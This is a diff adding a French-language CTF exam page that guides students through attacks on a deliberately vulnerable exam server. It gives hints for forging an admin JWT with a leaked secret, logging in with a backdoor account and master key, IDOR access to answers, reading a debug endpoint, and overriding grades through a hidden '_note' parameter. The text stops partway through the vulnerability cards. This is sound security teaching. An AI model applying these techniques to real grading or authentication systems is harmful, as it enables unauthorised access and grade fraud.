@@ -1,0 +1,1793 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>RedTeam Mission — EMSI CTF</title>
+    <link rel="stylesheet" href="css/styles.css">
+    <style>
+        body { font-family: 'Courier New', monospace; background: #0a0a0a; color: #00ff41; }
+        .terminal { background: #0d1117; border: 1px solid #30363d; border-radius: 8px; }
+        .terminal-header { background: #161b22; padding: 10px 16px; border-radius: 8px 8px 0 0; display: flex; align-items: center; gap: 8px; }
+        .dot { width: 12px; height: 12px; border-radius: 50%; }
+        .dot-red { background: #ff5f57; }
+        .dot-yellow { background: #ffbd2e; }
+        .dot-green { background: #28c840; }
+        .phase-card { border: 1px solid #30363d; border-radius: 8px; padding: 16px; background: #0d1117; transition: all 0.3s; }
+        .phase-card.completed { border-color: #00ff41; background: #001a00; }
+        .phase-card.locked { opacity: 0.5; }
+        .phase-badge { display: inline-block; padding: 2px 10px; border-radius: 4px; font-size: 11px; font-weight: bold; }
+        .badge-pending { background: #21262d; color: #8b949e; }
+        .badge-done { background: #003820; color: #00ff41; border: 1px solid #00ff41; }
+        .badge-pts { background: #1a1000; color: #ffa500; border: 1px solid #ffa500; }
+        .hint-btn { background: #161b22; border: 1px solid #30363d; color: #58a6ff; padding: 4px 12px; border-radius: 4px; cursor: pointer; font-size: 12px; font-family: inherit; }
+        .hint-btn:hover { background: #1f2937; border-color: #58a6ff; }
+        .hint-box { background: #0d1f38; border: 1px solid #1d4ed8; border-radius: 6px; padding: 12px; margin-top: 8px; font-size: 12px; color: #93c5fd; display: none; }
+        .flag-input { background: #161b22; border: 1px solid #30363d; color: #00ff41; padding: 8px 12px; border-radius: 6px; font-family: inherit; font-size: 13px; width: 100%; }
+        .flag-input:focus { outline: none; border-color: #00ff41; }
+        .flag-btn { background: #003820; border: 1px solid #00ff41; color: #00ff41; padding: 8px 20px; border-radius: 6px; cursor: pointer; font-family: inherit; font-weight: bold; }
+        .flag-btn:hover { background: #00ff41; color: #0a0a0a; }
+        .score-display { font-size: 48px; font-weight: bold; color: #00ff41; text-shadow: 0 0 20px #00ff41; }
+        .progress-bar-rt { height: 6px; background: #21262d; border-radius: 3px; overflow: hidden; }
+        .progress-fill { height: 100%; background: linear-gradient(90deg, #00ff41, #00cc33); transition: width 0.5s; }
+        .log-entry { font-size: 12px; color: #8b949e; padding: 2px 0; }
+        .log-entry.success { color: #00ff41; }
+        .log-entry.warning { color: #ffa500; }
+        .log-entry.error { color: #ff4444; }
+        .blink { animation: blink 1s step-end infinite; }
+        @keyframes blink { 50% { opacity: 0; } }
+        .scanline { position: fixed; top: 0; left: 0; right: 0; bottom: 0; pointer-events: none; background: repeating-linear-gradient(0deg, transparent, transparent 2px, rgba(0,0,0,0.03) 2px, rgba(0,0,0,0.03) 4px); z-index: 1000; }
+        .glow-text { text-shadow: 0 0 10px currentColor; }
+        ::-webkit-scrollbar { width: 6px; }
+        ::-webkit-scrollbar-track { background: #0d1117; }
+        ::-webkit-scrollbar-thumb { background: #30363d; border-radius: 3px; }
+
+        /* Phase icons */
+        .phase-icon { font-size: 24px; width: 40px; text-align: center; }
+
+        /* Tab system */
+        .tab-btn { padding: 8px 16px; border: none; background: transparent; color: #8b949e; cursor: pointer; font-family: inherit; font-size: 13px; border-bottom: 2px solid transparent; }
+        .tab-btn.active { color: #00ff41; border-bottom-color: #00ff41; }
+        .tab-content { display: none; }
+        .tab-content.active { display: block; }
+
+        /* Kill Chain mini strip */
+        .kc-mini { cursor: pointer; text-align: center; font-size: 20px; padding: 8px 10px; border-radius: 6px; border: 1px solid #30363d; background: #161b22; min-width: 60px; transition: all 0.2s; flex-shrink: 0; }
+        .kc-mini:hover { border-color: #00ff41; background: #002200; }
+        .kc-mini.kc-done { border-color: #00ff41; background: #001a00; }
+        .kc-mini.kc-done div { color: #00ff41 !important; }
+        .kc-arrow { color: #30363d; font-size: 16px; padding: 0 4px; flex-shrink: 0; }
+
+        /* Vuln cards */
+        .vuln-card { border: 1px solid #30363d; border-radius: 8px; padding: 16px; background: #0d1117; margin-bottom: 12px; }
+        .vuln-card:hover { border-color: #58a6ff; }
+        .cvss-badge { display: inline-block; padding: 2px 8px; border-radius: 4px; font-size: 11px; font-weight: bold; }
+        .cvss-critical { background: #4d0000; color: #ff6b6b; border: 1px solid #ff0000; }
+        .cvss-high { background: #3d1a00; color: #ff8c00; border: 1px solid #ff8c00; }
+        .cvss-medium { background: #2d2000; color: #ffd700; border: 1px solid #ffd700; }
+        .owasp-badge { display: inline-block; padding: 2px 8px; border-radius: 4px; font-size: 10px; background: #1a0d2e; color: #c084fc; border: 1px solid #7c3aed; }
+        .code-block { background: #161b22; border: 1px solid #30363d; border-radius: 6px; padding: 12px; font-size: 12px; color: #7dd3fc; margin: 8px 0; overflow-x: auto; white-space: pre; line-height: 1.5; }
+        .section-title { color: #fff; font-size: 14px; font-weight: bold; margin: 0 0 12px 0; padding-bottom: 8px; border-bottom: 1px solid #30363d; display: flex; align-items: center; gap: 8px; }
+        .collapsible-btn { background: #161b22; border: 1px solid #30363d; color: #8b949e; padding: 3px 10px; border-radius: 4px; cursor: pointer; font-size: 11px; font-family: inherit; float: right; }
+        .collapsible-btn:hover { color: #fff; border-color: #8b949e; }
+        .collapsible-content { display: none; }
+        .collapsible-content.open { display: block; }
+
+        /* Kill Chain diagram tab */
+        .kc-phase-block { border: 1px solid #30363d; border-radius: 8px; padding: 16px; background: #0d1117; margin-bottom: 12px; }
+        .kc-phase-block.kc-active { border-color: #ffa500; }
+        .technique-tag { display: inline-block; padding: 2px 8px; border-radius: 3px; font-size: 11px; background: #161b22; color: #8b949e; border: 1px solid #30363d; margin: 2px; }
+
+        /* Leaderboard */
+        .lb-row { display: grid; grid-template-columns: 40px 1fr 80px 100px; gap: 8px; padding: 8px 12px; border-bottom: 1px solid #21262d; font-size: 13px; }
+        .lb-row:hover { background: #161b22; }
+    </style>
+</head>
+<body>
+<div class="scanline"></div>
+
+<!-- Header -->
+<div style="background: #0d1117; border-bottom: 1px solid #30363d; padding: 12px 24px; display: flex; align-items: center; justify-content: space-between; position: sticky; top: 0; z-index: 100;">
+    <div style="display: flex; align-items: center; gap: 16px;">
+        <span style="color: #ff4444; font-size: 20px;">🔴</span>
+        <div>
+            <div style="font-size: 16px; font-weight: bold; color: #fff;">RED TEAM CTF — EMSI Exam Platform</div>
+            <div style="font-size: 11px; color: #8b949e;" id="header-info">Chargement...</div>
+        </div>
+    </div>
+    <div style="text-align: right;">
+        <div class="score-display" id="total-score">0</div>
+        <div style="font-size: 11px; color: #8b949e;">points / 125</div>
+    </div>
+</div>
+
+<div style="max-width: 1200px; margin: 0 auto; padding: 24px; display: grid; grid-template-columns: 1fr 360px; gap: 24px;">
+
+    <!-- LEFT: Kill Chain Phases -->
+    <div>
+        <!-- Tabs -->
+        <div style="border-bottom: 1px solid #30363d; margin-bottom: 20px; display: flex; gap: 4px; flex-wrap: wrap;">
+            <button class="tab-btn active" onclick="showTab('mission')">🎯 Mission</button>
+            <button class="tab-btn" onclick="showTab('vulns')">🔓 Vulnérabilités</button>
+            <button class="tab-btn" onclick="showTab('killchain')">⛓️ Kill Chain</button>
+            <button class="tab-btn" onclick="showTab('tools')">💻 Commandes</button>
+            <button class="tab-btn" onclick="showTab('leaderboard')">🏆 Classement</button>
+        </div>
+
+        <!-- MISSION TAB -->
+        <div id="tab-mission" class="tab-content active">
+            <div class="terminal" style="margin-bottom: 16px;">
+                <div class="terminal-header">
+                    <div class="dot dot-red"></div><div class="dot dot-yellow"></div><div class="dot dot-green"></div>
+                    <span style="color: #8b949e; font-size: 12px; margin-left: 8px;">mission_briefing.txt</span>
+                </div>
+                <div style="padding: 16px; font-size: 13px; line-height: 1.8;">
+                    <div style="color: #ff4444; font-size: 14px; font-weight: bold; letter-spacing: 2px;">[ BRIEFING CONFIDENTIEL — EMSI RedTeam Evaluation ]</div>
+                    <div style="border-top: 1px solid #30363d; margin: 10px 0;"></div>
+                    <div style="color: #ffa500;">CIBLE    : Serveur d'examen EMSI — port 3003</div>
+                    <div style="color: #ffa500;">SERVICES : HTTP:3003 / FTP:2121</div>
+                    <div style="color: #ffa500;">TECH     : Node.js / Express / JWT / JSON storage</div>
+                    <div style="border-top: 1px solid #30363d; margin: 10px 0;"></div>
+                    <div style="color: #fff; font-weight: bold; margin-bottom: 6px;">OBJECTIFS :</div>
+                    <div style="color: #8b949e;">&nbsp;&nbsp;[1] Identifier les services et fichiers exposés (Reconnaissance)</div>
+                    <div style="color: #8b949e;">&nbsp;&nbsp;[2] Forger un token JWT signé avec le secret découvert (Weaponization)</div>
+                    <div style="color: #8b949e;">&nbsp;&nbsp;[3] Accéder aux bonnes réponses via IDOR (Exploitation)</div>
+                    <div style="color: #8b949e;">&nbsp;&nbsp;[4] Obtenir des droits administrateur (Privilege Escalation)</div>
+                    <div style="color: #8b949e;">&nbsp;&nbsp;[5] Extraire les secrets internes du serveur (C2)</div>
+                    <div style="color: #8b949e;">&nbsp;&nbsp;[6] Consulter les données de tous les étudiants (Lateral Movement)</div>
+                    <div style="color: #8b949e;">&nbsp;&nbsp;[7] Modifier votre propre note via paramètre caché (Actions)</div>
+                    <div style="border-top: 1px solid #30363d; margin: 10px 0;"></div>
+                    <div style="color: #ff4444;">⚠  Ce serveur est intentionnellement vulnérable à des fins pédagogiques.</div>
+                    <div style="color: #ff4444;">⚠  N'exploitez ces techniques que dans ce cadre autorisé.</div>
+                    <div style="color: #00ff41; margin-top: 10px;">Bonne chance, <span id="agent-name">Agent</span>. <span class="blink">_</span></div>
+                </div>
+            </div>
+
+            <!-- Mini Kill Chain visuelle -->
+            <div style="display: flex; align-items: center; gap: 0; margin-bottom: 20px; overflow-x: auto; padding: 12px; background: #0d1117; border: 1px solid #30363d; border-radius: 8px;">
+                <div id="kc-mini-recon" class="kc-mini" onclick="showTab('killchain')" title="Reconnaissance">🔍<div style="font-size:9px; margin-top:2px; color:#8b949e;">RECON</div></div>
+                <div class="kc-arrow">→</div>
+                <div id="kc-mini-weapon" class="kc-mini" onclick="showTab('killchain')" title="Weaponization">⚔️<div style="font-size:9px; margin-top:2px; color:#8b949e;">WEAPON</div></div>
+                <div class="kc-arrow">→</div>
+                <div id="kc-mini-exploit" class="kc-mini" onclick="showTab('killchain')" title="Exploitation">💣<div style="font-size:9px; margin-top:2px; color:#8b949e;">EXPLOIT</div></div>
+                <div class="kc-arrow">→</div>
+                <div id="kc-mini-priv" class="kc-mini" onclick="showTab('killchain')" title="Privilege Escalation">⬆️<div style="font-size:9px; margin-top:2px; color:#8b949e;">PRIVESC</div></div>
+                <div class="kc-arrow">→</div>
+                <div id="kc-mini-c2" class="kc-mini" onclick="showTab('killchain')" title="C2">📡<div style="font-size:9px; margin-top:2px; color:#8b949e;">C2</div></div>
+                <div class="kc-arrow">→</div>
+                <div id="kc-mini-lateral" class="kc-mini" onclick="showTab('killchain')" title="Lateral Movement">↔️<div style="font-size:9px; margin-top:2px; color:#8b949e;">LATERAL</div></div>
+                <div class="kc-arrow">→</div>
+                <div id="kc-mini-actions" class="kc-mini" onclick="showTab('killchain')" title="Actions">🎯<div style="font-size:9px; margin-top:2px; color:#8b949e;">ACTIONS</div></div>
+            </div>
+
+            <!-- Kill Chain Phases -->
+            <div style="display: flex; flex-direction: column; gap: 12px;" id="phases-container">
+
+                <!-- Phase 1: Reconnaissance -->
+                <div class="phase-card" id="phase-reconnaissance" data-phase="reconnaissance">
+                    <div style="display: flex; align-items: center; justify-content: space-between; margin-bottom: 8px;">
+                        <div style="display: flex; align-items: center; gap: 12px;">
+                            <span class="phase-icon">🔍</span>
+                            <div>
+                                <div style="font-weight: bold; color: #fff;">Phase 1 — Reconnaissance</div>
+                                <div style="font-size: 11px; color: #8b949e;">Collecte d'informations sur la cible</div>
+                            </div>
+                        </div>
+                        <div style="display: flex; align-items: center; gap: 8px;">
+                            <span class="phase-badge badge-pts">+10 pts</span>
+                            <span class="phase-badge badge-pending" id="status-reconnaissance">EN ATTENTE</span>
+                        </div>
+                    </div>
+                    <div style="font-size: 12px; color: #8b949e; margin-bottom: 10px;">
+                        Découvrez les services exposés, les fichiers sensibles et les endpoints cachés.
+                    </div>
+                    <div style="display: flex; gap: 8px; flex-wrap: wrap; margin-bottom: 10px;">
+                        <button class="hint-btn" onclick="toggleHint('hint-recon-1')">💡 Indice 1</button>
+                        <button class="hint-btn" onclick="toggleHint('hint-recon-2')">💡 Indice 2</button>
+                        <button class="hint-btn" onclick="toggleHint('hint-recon-3')">💡 Indice 3</button>
+                    </div>
+                    <div class="hint-box" id="hint-recon-1">Vérifiez le fichier <code>/robots.txt</code> — les serveurs web y indiquent parfois des chemins qu'ils veulent cacher.</div>
+                    <div class="hint-box" id="hint-recon-2">Un serveur FTP anonyme est actif sur le port <code>2121</code>. Connectez-vous avec <code>ftp [IP] 2121</code>, login: <code>anonymous</code>, aucun mot de passe.</div>
+                    <div class="hint-box" id="hint-recon-3">Le fichier <code>/backup/deploy_notes.txt</code> via FTP contient des informations critiques sur l'infrastructure.</div>
+                    <div style="margin-top: 10px;">
+                        <div style="font-size: 11px; color: #8b949e; margin-bottom: 4px;">Validez la phase avec une preuve :</div>
+                        <div style="display: flex; gap: 8px;">
+                            <input type="text" class="flag-input" id="flag-reconnaissance" placeholder='ex: {"jwt_secret":"ensam-ctf-2024"} ou contenu robots.txt' style="flex:1;">
+                            <button class="flag-btn" onclick="soumettreFlag('reconnaissance', 'flag-reconnaissance')">VALIDER</button>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Phase 2: Weaponization -->
+                <div class="phase-card locked" id="phase-weaponization" data-phase="weaponization">
+                    <div style="display: flex; align-items: center; justify-content: space-between; margin-bottom: 8px;">
+                        <div style="display: flex; align-items: center; gap: 12px;">
+                            <span class="phase-icon">⚔️</span>
+                            <div>
+                                <div style="font-weight: bold; color: #fff;">Phase 2 — Weaponization</div>
+                                <div style="font-size: 11px; color: #8b949e;">Fabrication d'un exploit ou token forgé</div>
+                            </div>
+                        </div>
+                        <div style="display: flex; align-items: center; gap: 8px;">
+                            <span class="phase-badge badge-pts">+15 pts</span>
+                            <span class="phase-badge badge-pending" id="status-weaponization">VERROUILLÉE</span>
+                        </div>
+                    </div>
+                    <div style="font-size: 12px; color: #8b949e; margin-bottom: 10px;">
+                        Utilisez le secret JWT découvert pour forger un token avec les droits admin.
+                    </div>
+                    <div style="display: flex; gap: 8px; flex-wrap: wrap; margin-bottom: 10px;">
+                        <button class="hint-btn" onclick="toggleHint('hint-weapon-1')">💡 Indice 1</button>
+                        <button class="hint-btn" onclick="toggleHint('hint-weapon-2')">💡 Indice 2</button>
+                    </div>
+                    <div class="hint-box" id="hint-weapon-1">Utilisez <code>jwt.io</code> ou la librairie <code>jsonwebtoken</code> pour forger un token signé avec le secret <code>ensam-ctf-2024</code>. Payload: <code>&#123;"id":1,"role":"admin","nom":"Hacker"&#125;</code></div>
+                    <div class="hint-box" id="hint-weapon-2">En Python : <code>import jwt; jwt.encode(&#123;"id":1,"role":"admin","nom":"pwned"&#125;, "ensam-ctf-2024", algorithm="HS256")</code></div>
+                    <div style="margin-top: 10px;">
+                        <div style="font-size: 11px; color: #8b949e; margin-bottom: 4px;">Collez votre JWT forgé ici :</div>
+                        <div style="display: flex; gap: 8px;">
+                            <input type="text" class="flag-input" id="flag-weaponization" placeholder="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..." style="flex:1;">
+                            <button class="flag-btn" onclick="soumettreFlag('weaponization', 'flag-weaponization')">VALIDER</button>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Phase 3: Delivery / Exploitation -->
+                <div class="phase-card locked" id="phase-exploitation" data-phase="exploitation">
+                    <div style="display: flex; align-items: center; justify-content: space-between; margin-bottom: 8px;">
+                        <div style="display: flex; align-items: center; gap: 12px;">
+                            <span class="phase-icon">💣</span>
+                            <div>
+                                <div style="font-weight: bold; color: #fff;">Phase 3 — Exploitation (IDOR)</div>
+                                <div style="font-size: 11px; color: #8b949e;">Accès aux réponses correctes via IDOR</div>
+                            </div>
+                        </div>
+                        <div style="display: flex; align-items: center; gap: 8px;">
+                            <span class="phase-badge badge-pts">+20 pts</span>
+                            <span class="phase-badge badge-pending" id="status-exploitation">VERROUILLÉE</span>
+                        </div>
+                    </div>
+                    <div style="font-size: 12px; color: #8b949e; margin-bottom: 10px;">
+                        L'API expose les bonnes réponses via un endpoint IDOR non protégé. Accédez-y avec votre sessionId.
+                    </div>
+                    <div style="display: flex; gap: 8px; flex-wrap: wrap; margin-bottom: 10px;">
+                        <button class="hint-btn" onclick="toggleHint('hint-exploit-1')">💡 Indice 1</button>
+                        <button class="hint-btn" onclick="toggleHint('hint-exploit-2')">💡 Indice 2</button>
+                    </div>
+                    <div class="hint-box" id="hint-exploit-1">L'endpoint <code>/api/examen/answers/:sessionId</code> retourne les bonnes réponses sans vérifier si le sessionId vous appartient. Votre sessionId est affiché en bas de cette page.</div>
+                    <div class="hint-box" id="hint-exploit-2">Requête : <code>GET /api/examen/answers/VOTRE_SESSION_ID</code> — aucune authentification requise !</div>
+                    <div style="margin-top: 10px;">
+                        <div style="display: flex; gap: 8px; align-items: center; margin-bottom: 8px;">
+                            <button class="flag-btn" onclick="exploiterIDOR()" style="font-size: 12px; padding: 6px 14px;">⚡ Exploiter l'IDOR maintenant</button>
+                            <span style="font-size: 11px; color: #8b949e;">ou collez manuellement :</span>
+                        </div>
+                        <div style="display: flex; gap: 8px;">
+                            <input type="text" class="flag-input" id="flag-exploitation" placeholder='{"answers":{"qcm":[...]}}' style="flex:1;">
+                            <button class="flag-btn" onclick="soumettreFlag('exploitation', 'flag-exploitation')">VALIDER</button>
+                        </div>
+                    </div>
+                    <!-- Answers display -->
+                    <div id="answers-display" style="display:none; margin-top: 12px; background: #001a00; border: 1px solid #00ff41; border-radius: 6px; padding: 12px; font-size: 12px; max-height: 200px; overflow-y: auto;"></div>
+                </div>
+
+                <!-- Phase 4: Privilege Escalation -->
+                <div class="phase-card locked" id="phase-privilege_escalation" data-phase="privilege_escalation">
+                    <div style="display: flex; align-items: center; justify-content: space-between; margin-bottom: 8px;">
+                        <div style="display: flex; align-items: center; gap: 12px;">
+                            <span class="phase-icon">⬆️</span>
+                            <div>
+                                <div style="font-weight: bold; color: #fff;">Phase 4 — Privilege Escalation</div>
+                                <div style="font-size: 11px; color: #8b949e;">Obtenir des droits administrateur</div>
+                            </div>
+                        </div>
+                        <div style="display: flex; align-items: center; gap: 8px;">
+                            <span class="phase-badge badge-pts">+25 pts</span>
+                            <span class="phase-badge badge-pending" id="status-privilege_escalation">VERROUILLÉE</span>
+                        </div>
+                    </div>
+                    <div style="font-size: 12px; color: #8b949e; margin-bottom: 10px;">
+                        Utilisez le compte backdoor ou la master key pour obtenir un accès admin.
+                    </div>
+                    <div style="display: flex; gap: 8px; flex-wrap: wrap; margin-bottom: 10px;">
+                        <button class="hint-btn" onclick="toggleHint('hint-priv-1')">💡 Indice 1</button>
+                        <button class="hint-btn" onclick="toggleHint('hint-priv-2')">💡 Indice 2</button>
+                    </div>
+                    <div class="hint-box" id="hint-priv-1">Via le compte backdoor : POST <code>/api/auth/login</code> avec <code>&#123;"nom":"ctfadmin","motDePasse":"R3dT3am2024"&#125;</code></div>
+                    <div class="hint-box" id="hint-priv-2">Via la master key : POST <code>/api/admin/create-user</code> avec <code>&#123;"masterKey":"EMSI-MASTER-KEY-2024","nom":"hacker","motDePasse":"pwned","role":"admin"&#125;</code></div>
+                    <div style="margin-top: 10px;">
+                        <div style="display: flex; gap: 8px; align-items: center; margin-bottom: 8px;">
+                            <button class="flag-btn" onclick="escaladerPrivileges()" style="font-size: 12px; padding: 6px 14px;">⚡ Connexion backdoor auto</button>
+                        </div>
+                        <div style="display: flex; gap: 8px;">
+                            <input type="text" class="flag-input" id="flag-privilege_escalation" placeholder="Token admin JWT obtenu..." style="flex:1;">
+                            <button class="flag-btn" onclick="soumettreFlag('privilege_escalation', 'flag-privilege_escalation')">VALIDER</button>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Phase 5: C2 -->
+                <div class="phase-card locked" id="phase-c2" data-phase="c2">
+                    <div style="display: flex; align-items: center; justify-content: space-between; margin-bottom: 8px;">
+                        <div style="display: flex; align-items: center; gap: 12px;">
+                            <span class="phase-icon">📡</span>
+                            <div>
+                                <div style="font-weight: bold; color: #fff;">Phase 5 — Command &amp; Control</div>
+                                <div style="font-size: 11px; color: #8b949e;">Accéder aux internals via l'endpoint de debug</div>
+                            </div>
+                        </div>
+                        <div style="display: flex; align-items: center; gap: 8px;">
+                            <span class="phase-badge badge-pts">+15 pts</span>
+                            <span class="phase-badge badge-pending" id="status-c2">VERROUILLÉE</span>
+                        </div>
+                    </div>
+                    <div style="font-size: 12px; color: #8b949e; margin-bottom: 10px;">
+                        Le serveur expose un endpoint de debug non protégé qui retourne tous les secrets internes.
+                    </div>
+                    <div style="display: flex; gap: 8px; flex-wrap: wrap; margin-bottom: 10px;">
+                        <button class="hint-btn" onclick="toggleHint('hint-c2-1')">💡 Indice 1</button>
+                    </div>
+                    <div class="hint-box" id="hint-c2-1">GET <code>/api/debug</code> — Retourne jwt_secret, liste des utilisateurs, config de l'examen. Aucune authentification requise.</div>
+                    <div style="margin-top: 10px;">
+                        <div style="display: flex; gap: 8px; align-items: center; margin-bottom: 8px;">
+                            <button class="flag-btn" onclick="accederDebug()" style="font-size: 12px; padding: 6px 14px;">⚡ GET /api/debug</button>
+                        </div>
+                        <div style="display: flex; gap: 8px;">
+                            <input type="text" class="flag-input" id="flag-c2" placeholder='{"jwt_secret":"ensam-ctf-2024",...}' style="flex:1;">
+                            <button class="flag-btn" onclick="soumettreFlag('c2', 'flag-c2')">VALIDER</button>
+                        </div>
+                    </div>
+                    <div id="debug-display" style="display:none; margin-top: 12px; background: #001a00; border: 1px solid #00ff41; border-radius: 6px; padding: 12px; font-size: 11px; max-height: 200px; overflow-y: auto; word-break: break-all;"></div>
+                </div>
+
+                <!-- Phase 6: Lateral Movement -->
+                <div class="phase-card locked" id="phase-lateral_movement" data-phase="lateral_movement">
+                    <div style="display: flex; align-items: center; justify-content: space-between; margin-bottom: 8px;">
+                        <div style="display: flex; align-items: center; gap: 12px;">
+                            <span class="phase-icon">↔️</span>
+                            <div>
+                                <div style="font-weight: bold; color: #fff;">Phase 6 — Lateral Movement</div>
+                                <div style="font-size: 11px; color: #8b949e;">Accéder aux données d'autres étudiants</div>
+                            </div>
+                        </div>
+                        <div style="display: flex; align-items: center; gap: 8px;">
+                            <span class="phase-badge badge-pts">+10 pts</span>
+                            <span class="phase-badge badge-pending" id="status-lateral_movement">VERROUILLÉE</span>
+                        </div>
+                    </div>
+                    <div style="font-size: 12px; color: #8b949e; margin-bottom: 10px;">
+                        Accédez aux stats et corrections des autres étudiants via des endpoints sans authentification.
+                    </div>
+                    <div style="display: flex; gap: 8px; flex-wrap: wrap; margin-bottom: 10px;">
+                        <button class="hint-btn" onclick="toggleHint('hint-lateral-1')">💡 Indice 1</button>
+                    </div>
+                    <div class="hint-box" id="hint-lateral-1">GET <code>/api/professeur/stats</code> et GET <code>/api/professeur/corrections</code> ne requièrent aucun token. Vous pouvez voir les résultats de tous les étudiants.</div>
+                    <div style="margin-top: 10px;">
+                        <div style="display: flex; gap: 8px; align-items: center; margin-bottom: 8px;">
+                            <button class="flag-btn" onclick="accederStats()" style="font-size: 12px; padding: 6px 14px;">⚡ GET /api/professeur/stats</button>
+                        </div>
+                        <div style="display: flex; gap: 8px;">
+                            <input type="text" class="flag-input" id="flag-lateral_movement" placeholder="Collez les stats obtenues..." style="flex:1;">
+                            <button class="flag-btn" onclick="soumettreFlag('lateral_movement', 'flag-lateral_movement')">VALIDER</button>
+                        </div>
+                    </div>
+                    <div id="stats-display" style="display:none; margin-top: 12px; background: #001a00; border: 1px solid #00ff41; border-radius: 6px; padding: 12px; font-size: 11px; max-height: 150px; overflow-y: auto;"></div>
+                </div>
+
+                <!-- Phase 7: Actions on Objectives -->
+                <div class="phase-card locked" id="phase-actions" data-phase="actions">
+                    <div style="display: flex; align-items: center; justify-content: space-between; margin-bottom: 8px;">
+                        <div style="display: flex; align-items: center; gap: 12px;">
+                            <span class="phase-icon">🎯</span>
+                            <div>
+                                <div style="font-weight: bold; color: #fff;">Phase 7 — Actions on Objectives</div>
+                                <div style="font-size: 11px; color: #8b949e;">Modifier votre propre note</div>
+                            </div>
+                        </div>
+                        <div style="display: flex; align-items: center; gap: 8px;">
+                            <span class="phase-badge badge-pts">+30 pts</span>
+                            <span class="phase-badge badge-pending" id="status-actions">VERROUILLÉE</span>
+                        </div>
+                    </div>
+                    <div style="font-size: 12px; color: #8b949e; margin-bottom: 10px;">
+                        L'endpoint de soumission accepte un paramètre caché <code>_note</code> qui remplace directement votre note.
+                    </div>
+                    <div style="display: flex; gap: 8px; flex-wrap: wrap; margin-bottom: 10px;">
+                        <button class="hint-btn" onclick="toggleHint('hint-actions-1')">💡 Indice 1</button>
+                        <button class="hint-btn" onclick="toggleHint('hint-actions-2')">💡 Indice 2</button>
+                    </div>
+                    <div class="hint-box" id="hint-actions-1">POST <code>/api/examen/submit</code> avec le body JSON contenant <code>"_note": 20</code> en plus de vos réponses normales. Ce paramètre override votre note finale.</div>
+                    <div class="hint-box" id="hint-actions-2">Exemple : <code>&#123;"sessionId":"...", "reponses":&#123;&#125;, "_note": 20&#125;</code></div>
+                    <div style="margin-top: 10px;">
+                        <div style="font-size: 11px; color: #8b949e; margin-bottom: 6px;">Note souhaitée (0-20) :</div>
+                        <div style="display: flex; gap: 8px; align-items: center; margin-bottom: 8px;">
+                            <input type="number" class="flag-input" id="note-cible" min="0" max="20" value="20" style="width: 80px;">
+                            <button class="flag-btn" onclick="modifierNote()" style="font-size: 12px; padding: 6px 14px;">⚡ Soumettre avec _note</button>
+                        </div>
+                        <div style="display: flex; gap: 8px;">
+                            <input type="text" class="flag-input" id="flag-actions" placeholder='{"noteSur20":20,"_overridden":true,...}' style="flex:1;">
+                            <button class="flag-btn" onclick="soumettreFlag('actions', 'flag-actions')">VALIDER</button>
+                        </div>
+                    </div>
+                    <div id="note-display" style="display:none; margin-top: 12px;"></div>
+                </div>
+
+            </div><!-- /phases-container -->
+        </div><!-- /tab-mission -->
+
+        <!-- ═══ VULNÉRABILITÉS TAB ═══════════════════════════════════════════ -->
+        <div id="tab-vulns" class="tab-content">
+
+            <div style="font-size: 12px; color: #8b949e; margin-bottom: 16px; padding: 10px; background: #0d1117; border: 1px solid #30363d; border-radius: 6px;">
+                Ce serveur contient <strong style="color:#ff4444;">10 vulnérabilités intentionnelles</strong> couvrant les catégories OWASP Top 10 2021.
+                Chaque vulnérabilité est mappée à une phase de la Cyber Kill Chain et rapporte des points lors de son exploitation.
+            </div>
+
+            <!-- VULN-001 -->
+            <div class="vuln-card">
+                <div style="display:flex; justify-content:space-between; align-items:flex-start; margin-bottom:10px; flex-wrap:wrap; gap:6px;">
+                    <div>
+                        <span style="color:#ff4444; font-weight:bold; font-size:13px;">VULN-001</span>
+                        <span style="color:#fff; font-weight:bold; font-size:13px; margin-left:8px;">Secret JWT hardcodé et faible</span>
+                    </div>
+                    <div style="display:flex; gap:6px; flex-wrap:wrap;">
+                        <span class="cvss-badge cvss-critical">CVSS 9.1 — CRITIQUE</span>
+                        <span class="owasp-badge">A02:2021 Cryptographic Failures</span>
+                        <span class="phase-badge badge-pts">Phase 2 — Weaponization</span>
+                    </div>
+                </div>
+                <div style="font-size:12px; color:#8b949e; margin-bottom:10px; line-height:1.6;">
+                    <strong style="color:#ccc;">Qu'est-ce que c'est ?</strong><br>
+                    Le JSON Web Token (JWT) est un standard pour transmettre des identités entre client et serveur. Sa sécurité repose entièrement sur le secret utilisé pour le signer.
+                    Ici, le secret <code style="color:#ffa500;">ensam-ctf-2024</code> est codé en dur dans le code source <em>et</em> exposé en clair dans le fichier <code>backup/jwt_config.txt</code> accessible via FTP.
+                    <br><br>
+                    <strong style="color:#ccc;">Impact :</strong> Toute personne connaissant ce secret peut forger un token JWT avec n'importe quel rôle (admin), court-circuitant toute la couche d'authentification.
+                    <br><br>
+                    <strong style="color:#ccc;">Contre-mesure :</strong> Utiliser un secret aléatoire de 256+ bits stocké dans une variable d'environnement non versionnée (<code>.env</code> dans <code>.gitignore</code>).
+                </div>
+                <button class="collapsible-btn" onclick="toggleCollapsible(this)">▼ Voir exploit</button>
+                <div class="collapsible-content">
+                    <div class="code-block">$ python3 -c "import jwt; print(jwt.encode({'id':1,'role':'admin','nom':'hacker'}, 'ensam-ctf-2024', algorithm='HS256'))"
+# → eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwicm9sZSI6ImFkbWluIn0.xxx</div>
+                </div>
+            </div>
+
+            <!-- VULN-002 -->
+            <div class="vuln-card">
+                <div style="display:flex; justify-content:space-between; align-items:flex-start; margin-bottom:10px; flex-wrap:wrap; gap:6px;">
+                    <div>
+                        <span style="color:#ff4444; font-weight:bold; font-size:13px;">VULN-002</span>
+                        <span style="color:#fff; font-weight:bold; font-size:13px; margin-left:8px;">Endpoint /api/debug sans authentification</span>
+                    </div>
+                    <div style="display:flex; gap:6px; flex-wrap:wrap;">
+                        <span class="cvss-badge cvss-critical">CVSS 9.8 — CRITIQUE</span>
+                        <span class="owasp-badge">A05:2021 Security Misconfiguration</span>
+                        <span class="phase-badge badge-pts">Phase 5 — C2</span>
+                    </div>
+                </div>
+                <div style="font-size:12px; color:#8b949e; margin-bottom:10px; line-height:1.6;">
